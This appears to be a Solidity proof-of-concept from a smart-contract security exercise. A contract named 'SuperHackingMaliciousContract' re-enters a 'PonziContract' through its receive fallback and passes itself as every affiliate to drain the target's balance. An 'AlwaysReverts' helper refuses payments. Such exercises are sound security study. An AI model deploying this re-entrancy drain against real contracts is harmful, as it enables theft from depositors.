// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PonziContract.sol";

contract SuperHackingMaliciousContract {
    PonziContract ponzi;

    constructor(PonziContract _ponzi) {
        ponzi = _ponzi;
    }

    receive() external payable {
        if (address(ponzi).balance > 1 ether) {
            address[] memory _affiliates = new address[](ponzi.affiliatesCount());
            for (uint256 i = 0; i < ponzi.affiliatesCount(); i++) {
                _affiliates[i] = address(this);
            }
            ponzi.joinPonzi(_affiliates);
        }
    }

    function attack() external payable {
        address[] memory _affiliates = new address[](ponzi.affiliatesCount());
        for (uint256 i = 0; i < ponzi.affiliatesCount(); i++) {
            _affiliates[i] = address(this);
        }
        ponzi.joinPonzi(_affiliates);
    }
}

contract AlwaysReverts {
    receive() external payable {
        revert("I always fail");
    }
}
